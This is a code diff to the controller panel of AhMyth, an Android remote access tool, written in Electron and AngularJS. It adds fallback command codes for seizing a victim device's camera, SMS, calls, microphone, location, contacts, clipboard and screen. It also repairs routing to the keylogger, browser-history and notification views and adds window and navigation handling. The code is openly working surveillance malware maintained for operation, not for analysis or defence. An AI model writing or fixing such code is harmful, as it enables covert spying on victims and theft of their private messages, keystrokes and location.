@@ -2,11 +2,55 @@ const { remote } = require('electron');
 const { ipcRenderer } = require('electron');
 var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
 var fs = require("fs-extra");
-const CONSTANTS = require('../../Constants');
-var ORDER = CONSTANTS.order;
-var originalSocket = remote.getCurrentWebContents().victim;
 var homedir = require('node-homedir');
 var path = require("path");
+
+// Fix Constants require path - use path resolution that works in Electron renderer
+let CONSTANTS;
+try {
+    // Try relative path first (works when script is loaded as module)
+    CONSTANTS = require('../Constants');
+} catch (e) {
+    try {
+        // Fallback: resolve from app directory using remote
+        if (remote && remote.app) {
+            const appPath = path.resolve(remote.app.getAppPath(), 'app', 'assets', 'js', 'Constants.js');
+            CONSTANTS = require(appPath);
+        } else {
+            // Last resort: try resolving from known structure
+            const constantsPath = path.resolve(__dirname || process.cwd(), 'app', 'assets', 'js', 'Constants.js');
+            CONSTANTS = require(constantsPath);
+        }
+    } catch (e2) {
+        console.error('Failed to load Constants:', e2);
+        // Create a minimal fallback to prevent complete failure
+        CONSTANTS = {
+            order: 'order',
+            orders: {
+                camera: 'x0000ca',
+                fileManager: 'x0000fm',
+                calls: 'x0000cl',
+                sms: 'x0000sm',
+                mic: 'x0000mc',
+                location: 'x0000lm',
+                contacts: 'x0000cn',
+                deviceInfo: 'x0000di',
+                apps: 'x0000ap',
+                clipboard: 'x0000cb',
+                wifi: 'x0000wf',
+                screen: 'x0000sc'
+            },
+            logStatus: { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 },
+            logColors: { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" },
+            dataDir: 'AhMyth',
+            downloadPath: 'Downloads',
+            outputApkPath: 'Output'
+        };
+    }
+}
+
+var ORDER = CONSTANTS.order;
+var originalSocket = remote.getCurrentWebContents().victim;
 
 var dataPath = path.join(homedir(), CONSTANTS.dataDir);
 var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
@@ -56,74 +100,80 @@ var socket = {
 };
 
 //-----------------------Routing Config------------------------
-app.config(function ($routeProvider) {
+app.config(function ($routeProvider, $locationProvider) {
+    // Configure location provider for hash-based routing (works better in Electron)
+    $locationProvider.hashPrefix('');
+    
     $routeProvider
         .when("/", {
-            templateUrl: "./views/main.html"
+            templateUrl: "views/main.html"
         })
         .when("/camera", {
-            templateUrl: "./views/camera.html",
+            templateUrl: "views/camera.html",
             controller: "CamCtrl"
         })
         .when("/fileManager", {
-            templateUrl: "./views/fileManager.html",
+            templateUrl: "views/fileManager.html",
             controller: "FmCtrl"
         })
         .when("/smsManager", {
-            templateUrl: "./views/smsManager.html",
+            templateUrl: "views/smsManager.html",
             controller: "SMSCtrl"
         })
         .when("/callsLogs", {
-            templateUrl: "./views/callsLogs.html",
+            templateUrl: "views/callsLogs.html",
             controller: "CallsCtrl"
         })
         .when("/contacts", {
-            templateUrl: "./views/contacts.html",
+            templateUrl: "views/contacts.html",
             controller: "ContCtrl"
         })
         .when("/mic", {
-            templateUrl: "./views/mic.html",
+            templateUrl: "views/mic.html",
             controller: "MicCtrl"
         })
         .when("/location", {
-            templateUrl: "./views/location.html",
+            templateUrl: "views/location.html",
             controller: "LocCtrl"
         })
         .when("/deviceInfo", {
-            templateUrl: "./views/deviceInfo.html",
+            templateUrl: "views/deviceInfo.html",
             controller: "DeviceInfoCtrl"
         })
         .when("/apps", {
-            templateUrl: "./views/apps.html",
+            templateUrl: "views/apps.html",
             controller: "AppsCtrl"
         })
         .when("/clipboard", {
-            templateUrl: "./views/clipboard.html",
+            templateUrl: "views/clipboard.html",
             controller: "ClipboardCtrl"
         })
         .when("/wifi", {
-            templateUrl: "./views/wifi.html",
+            templateUrl: "views/wifi.html",
             controller: "WiFiCtrl"
         })
         .when("/screen", {
-            templateUrl: "./views/screen.html",
+            templateUrl: "views/screen.html",
             controller: "ScreenCtrl"
         })
         .when("/keylogger", {
-            templateUrl: "./views/keylogger.html",
+            templateUrl: "views/keylogger.html",
             controller: "KeyloggerCtrl"
         })
         .when("/browserHistory", {
-            templateUrl: "./views/browserHistory.html",
+            templateUrl: "views/browserHistory.html",
             controller: "BrowserHistoryCtrl"
         })
         .when("/notifications", {
-            templateUrl: "./views/notifications.html",
+            templateUrl: "views/notifications.html",
             controller: "NotificationsCtrl"
         })
         .when("/systemInfo", {
-            templateUrl: "./views/systemInfo.html",
+            templateUrl: "views/systemInfo.html",
             controller: "SystemInfoCtrl"
+        })
+        .otherwise({
+            redirectTo: '/'
         });
 });
 
@@ -131,16 +181,24 @@ app.config(function ($routeProvider) {
 
 //-----------------------LAB Controller (lab.htm)------------------------
 // controller for Lab.html and its views mic.html,camera.html..etc
-app.controller("LabCtrl", function ($scope, $rootScope, $location) {
+app.controller("LabCtrl", function ($scope, $rootScope, $location, $route) {
     $labCtrl = $scope;
     $labCtrl.logs = [];
 
-    // Wait for DOM to be ready
+    // Wait for DOM to be ready and initialize routing
     setTimeout(() => {
         var log = document.getElementById("logy");
         if (!log) {
             console.error("[AhMyth Lab] Logy element not found!");
         }
+        
+        // Ensure routing is initialized - navigate to default route if no route is set
+        if ($location.path() === '' || $location.path() === '/') {
+            $location.path('/');
+            $scope.$apply();
+        }
+        
+        console.log('[AhMyth Lab] Controller initialized, current path:', $location.path());
     }, 100);
 
     // Handle remote module with fallback
@@ -157,6 +215,14 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location) {
             electronWindow.close();
         } else {
             ipcRenderer.send('window-close');
+        }
+    };
+
+    $labCtrl.minimize = () => {
+        if (electronWindow) {
+            electronWindow.minimize();
+        } else {
+            ipcRenderer.send('window-minimize');
         }
     };
 
@@ -230,8 +296,31 @@ app.controller("LabCtrl", function ($scope, $rootScope, $location) {
 
     // to move from view to another
     $labCtrl.goToPage = (page) => {
-        $location.path('/' + page);
+        try {
+            const path = '/' + page;
+            console.log('[AhMyth Lab] Navigating to:', path);
+            $location.path(path);
+            if (!$scope.$$phase && !$scope.$root.$$phase) {
+                $scope.$apply();
+            }
+        } catch (error) {
+            console.error('[AhMyth Lab] Navigation error:', error);
+            $rootScope.Log(`[✗] Failed to navigate to ${page}`, CONSTANTS.logStatus.FAIL);
+        }
     }
+    
+    // Handle route change errors
+    $scope.$on('$routeChangeError', function(event, current, previous, rejection) {
+        console.error('[AhMyth Lab] Route change error:', rejection);
+        $rootScope.Log('[✗] Failed to load view: ' + (rejection || 'Unknown error'), CONSTANTS.logStatus.FAIL);
+    });
+    
+    // Handle successful route changes
+    $scope.$on('$routeChangeSuccess', function(event, current, previous) {
+        if (current && current.$$route) {
+            console.log('[AhMyth Lab] Route changed to:', current.$$route.originalPath);
+        }
+    });
 
 
 
